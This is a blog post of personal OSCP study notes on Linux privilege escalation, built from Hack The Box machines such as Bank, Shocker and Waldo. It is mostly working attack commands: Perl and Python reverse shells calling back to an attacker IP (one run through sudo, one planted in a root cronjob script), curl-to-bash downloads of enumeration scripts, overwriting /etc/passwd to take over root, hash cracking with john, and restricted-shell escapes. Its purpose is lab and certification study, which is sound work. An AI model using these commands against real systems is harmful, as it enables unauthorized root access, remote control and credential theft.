---
title: "OSCP: Linux Privilege Escalation"
last_modified_at: 2019-11-01T16:20:02-05:00
categories:
  - Cyber Security
tags:
  - OSCP
  - Linux
  - Privilege Escalation
---

privesc_linux
UPGRADE SHELL python -c ‘import pty; pty.spawn("bin/bash")’
ctrl-Z
stty raw -echo
fg
Enumerate and run this:
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
”_ If you don’t see a compiler such as GCC, you know it’s probably not going to be a kernel exploit. So enumerate and use
LinEnum.sh or Linuxprivescchecker.py. I found on one of my 20 point boxes it only perl and wget, so I was looking for priv esc
related to perl. The other 20 pointer had GCC, so I googled a linux exploit, 2 minutes later I am root.
BY HAND 1. sudo -l # view users rights has to be tried first for all linux privesc
2. rw on /etc/passwd → echo root::0:0:root:/root:/bin/bash > /etc/passwd → su
3. bash_history
4. find / -perm -4000 2>/dev/null # SUID files - detect by date?
5. Do all cronjobs look normal and do you have write access to any??
6. ps aux | grep root == john mysql -u root
7. If webserver poke around database
8. Look at original nmap scan for other shite running (nmap localhost)
sudo -u anotheruser command run sommand as another user
sudo -u scriptmanager bash -i #run shell as user scriptmanager
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2>/dev/null
DOWNLOAD ALL LINUX ENUM FILES TO VICTIM cd /opt/linux_privesc
python -m SimpleHTTPServer
wget -r 10.10.14.7:8000
curl 10.10.14.7/LinEnum | bash # pipe into bash
or save to victim
linEnum.sh has a -t flag for thorough!!
make a thorough linEnum script bu putting thorough = 1 at top of script
KERNEL EXPLOITS i686 = 32bit
x86_64 = 64bit
when u pop a box what usernames and info did you get on the way in that may help
Get Linux version from Apache version etc... Launchpad?
linux exploit suggester
the exploit will give linux version + exploitable file
check your own file version
eg
ldd --version
cat /etc/lsb-release
Can ignore warnings on gcc compiles
LINUX VERSIONS
ubuntu 2.2.22 apache → launchpad link → prcise
Google ubuntu releases wiki.ubuntu.com/Releases → End of Lifes?
nmap --script vuln -oA nmap/vulns 10.10.10.79
Freebsd uses csh shell
LINUX PASSWORDS unshadow passwd.txt shadow.txt > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
42/67
WRITABLE /etc/passwd (Bank) Create encrypted password and place in passwd file
openssl passwd --help
openssl passwd dan
dfVJQnZOraiAw
openssl passwd -1 dan # specifies md5
vi /etc/passwd
replace
root:x:0:0:root:/root:/bin/bash
with
root:dfVJQnZOraiAw:0:0:root:/root:/bin/bash
su root
Password: dan
SUID (Bank) find / -perm -4000 2>/dev/null
/var/htb/bin/emergency
$ ls -la /var/htb/bin/emergency
-rwsr-xr-x 1 root root 112204 Jun 14 2017 /var/htb/bin/emergency
Just run the binary and gain root
/var/htb/bin/emergency
That was simple (will often need to edit binary)
ESCALATE VIA MYSQL ROOT credentials → go into mysql as root then drop ito a shell to pwn box
mysql -u root -p
Enter password: !@#S3cur3P4ssw0rd!@#
Create shell in mysql
\! /bin/sh
DIDNT ESCALATE
sudo -l sudo -l
User shelly may run the following commands on Shocker:
(root) NOPASSWD: /usr/bin/perl
Get the pentest monkey perl shell
Important to add sudo before
sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.7";
$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
A cronjob (of sorts) test.py owned by us (we are scriptmanager). But note the output (test.txt) is root.
Goody gumdrops.
Put in a new test.py.
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",
4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
Open listener on KALI: nc -nlvp 4444
Serve it it to victim's scripts folder
Let the cronjob run → shell
43/67
RESTRICTED BASH To view what we CAN run
monitor@waldo:~$ echo $PATH
/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
ls /home/monitor/bin
ls most red rnano
ls -la /home/monitor/app-dev
total 2236
drwxrwx--- 3 app-dev monitor 4096 May 3 2018 .
drwxr-x--- 5 root monitor 4096 Jul 24 2018 ..
-rwxrwx--- 1 app-dev monitor 13704 Jul 24 2018 logMonitor
rwx-able if we are in monitor group?
rnano /etc/group
monitor:x:1001: ← yes
We will copy /bin/bash and paste it over logMonitor
red /bin/bash ← restricted edit
1099016
w app-dev/logMonitor <- write to logMonitorcd ~
1099016
q
logMonitor
tmp.tUiSCVyRTR: dircolors: command not found
We now have /bin/bash BUT we can still only do whats in our path. BUT... we can echo a normal path (from kali) and set it on
Waldo
ON KALI
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:/root/go-workspace/bin
ON WALDO
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:/root/go-workspace/bin
GET LINENUM WITH CURL
root@kali:/opt/linux_privesc# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
curl 10.10.14.11:8000/linEnumThorough.sh | bash
[+] Files with POSIX capabilities set:
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
[+] Capabilities associated with the current user:
cap_dac_read_search ←
[+] Permissions of files with the same capabilities associated with the current user:
-rwxr-xr-x 1 root root 39752 Feb 22 2017 /usr/bin/tac
man capabilities
CAP_DAC_READ_SEARCH
* Bypass file read permission checks and directory read and execute permission checks;